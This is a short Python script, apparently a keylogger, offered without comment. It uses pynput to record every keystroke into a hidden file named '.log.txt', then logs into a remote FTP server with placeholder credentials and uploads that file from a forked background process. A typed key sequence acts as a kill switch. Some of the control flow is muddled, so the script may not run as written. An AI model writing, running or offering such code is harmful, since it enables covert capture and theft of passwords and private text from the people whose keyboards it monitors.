import ftplib
import pynput.keyboard
import sys
import os

key_sequence = "abcdefgh"
def on_press(key):
    global key_sequence
    with open(".log.txt", "a") as f:
        f.write(str(key))
    pressed_key = str(key).replace("'", "")
    if key_sequence.startswith(pressed_key):
        key_sequence = key_sequence[len(pressed_key):]
        if not key_sequence:
            sys.exit()

def upload_file(ftp, file):
    with open(file, "rb") as f:
        ftp.storbinary("STOR " + file, f)

ftp = ftplib.FTP("ftp.server.com")
ftp.login("username", "password")

keyboard_listener = pynput.keyboard.Listener(on_press=on_press)
with keyboard_listener:
    pid = os.fork()
    if pid == 0:
        upload_file(ftp, ".log.txt")
        keyboard_listener.start()
        sys.exit()
    else:
        sys.exit()

ftp.quit()